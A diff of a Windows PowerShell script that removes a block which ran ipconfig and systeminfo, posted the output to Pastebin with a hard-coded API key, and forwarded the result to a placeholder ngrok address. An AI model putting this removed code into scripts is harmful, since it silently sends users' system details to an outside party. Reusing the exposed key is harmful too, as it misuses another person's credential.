@@ -1,31 +1,5 @@
 Add-Type -AssemblyName System.Windows.Forms 
 Clear-Host
-$code = & {
-    ipconfig
-    systeminfo 
-}
-$apiDevKey = 'MeTtiikiD4VhmwiqN9QrE8wuMPSVIaui'
-$apiPasteCode = $code 
-$apiPasteName = 'denis'  
-$apiPastePrivate = '0'
-$apiPasteExpireDate = '10M'
-$apiPasteFormat = 'php'
-$apiUserKey = ''
-$apiUrl = 'https://pastebin.com/api/api_post.php'
-
-$apiPasteName = [System.Web.HttpUtility]::UrlEncode($apiPasteName)
-$apiPasteCode = [System.Web.HttpUtility]::UrlEncode($apiPasteCode)
-
-$body = "api_dev_key=$apiDevKey&api_paste_code=$apiPasteCode&api_option=paste&api_paste_private=$apiPastePrivate&api_paste_name=$apiPasteName&api_paste_expire_date=$apiPasteExpireDate&api_paste_format=$apiPasteFormat&api_user_key=$apiUserKey"
-
-$response = Invoke-WebRequest -Uri $apiUrl -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
-
-$ngrokUrl = "ip"
-$headers = @{
-    "Content-Type" = "text/plain"
-}
-
-Invoke-RestMethod -Uri $ngrokUrl -Method Post -Body $response.Content -Headers $headers
 
 function Check-Administrator {
     if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
